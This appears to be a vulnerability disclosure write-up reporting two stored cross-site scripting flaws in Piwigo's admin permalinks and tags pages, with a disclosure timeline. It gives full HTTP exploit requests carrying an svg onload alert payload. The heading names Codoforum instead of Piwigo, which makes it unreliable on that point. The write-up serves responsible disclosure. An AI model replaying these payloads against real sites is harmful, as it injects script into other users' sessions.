# This is what I achived when research on [Codoforum 2.10.1](https://piwigo.org/)
## Stored XSS in /admin.php?page=permalinks
### Exploit request

```
POST /piwigo/piwigo/admin.php?page=permalinks HTTP/1.1
Host: 192.168.10.138
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Origin: http://192.168.10.138
Connection: close
Referer: http://192.168.10.138/piwigo/piwigo/admin.php?page=permalinks
Cookie: pwg_id=ragm92nc6a3rr532fi0h9h6f21
Upgrade-Insecure-Requests: 1

cat_id=3&permalink=%3Csvg%2Fonload%3Dalert%28document.domain%29%3E&save=on&set_permalink=Submit&pwg_token=2048f9dd482aaca003e193045fd4f763
```

### PoC
![](https://github.com/matuhn/Research/raw/master/Piwigo/1.png)
![](https://github.com/matuhn/Research/raw/master/Piwigo/2.png)
# REPORT TIMELINE
# 02/12/2020: Discovered the vulnerability
# 02/12/2020: Contact vendor to confirm the vulnerability
# 02/17/2020: Contact MITRE because vendor is unresponsive


## Stored XSS in /admin.php?page=tags
### Exploit request

```
POST /piwigo/piwigo/admin.php?page=tags HTTP/1.1
Host: 192.168.10.138
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: http://192.168.10.138
Connection: close
Referer: http://192.168.10.138/piwigo/piwigo/admin.php?page=tags
Cookie: pwg_id=kikufgh78rp553s266q6r0sj62
Upgrade-Insecure-Requests: 1

pwg_token=c8dea9237930ccb48c6d1a4e5020b32b&add_tag=%3Csvg%2Fonload%3Dalert%28document.domain%29%3E&add=Submit
```

### PoC
![](https://github.com/matuhn/Research/raw/master/Piwigo/3.png)
# REPORT TIMELINE
# 02/12/2020: Discovered the vulnerability
# 02/12/2020: Contact vendor to confirm the vulnerability
# 02/17/2020: Contact MITRE because vendor is unresponsive
